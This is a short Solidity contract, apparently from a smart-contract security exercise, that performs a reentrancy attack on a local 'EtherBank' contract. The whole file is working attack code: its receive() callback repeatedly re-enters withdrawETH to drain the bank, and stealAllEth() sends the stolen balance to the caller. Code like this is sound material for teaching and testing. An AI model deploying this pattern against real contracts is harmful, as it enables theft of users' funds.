// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../EtherBank.sol";

contract AttackerReentrancy1 {
    EtherBank etherBank;

    constructor(address _etherBankAddres) {
        etherBank = EtherBank(_etherBankAddres);
    }

    function attack() external payable {
        etherBank.depositETH{value: msg.value}();
        etherBank.withdrawETH();
    }

    function stealAllEth() public {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "ETH stealing failed");
    }

    receive() external payable {
        if (address(etherBank).balance >= 1 ether) {
            etherBank.withdrawETH();
        }
    }
}
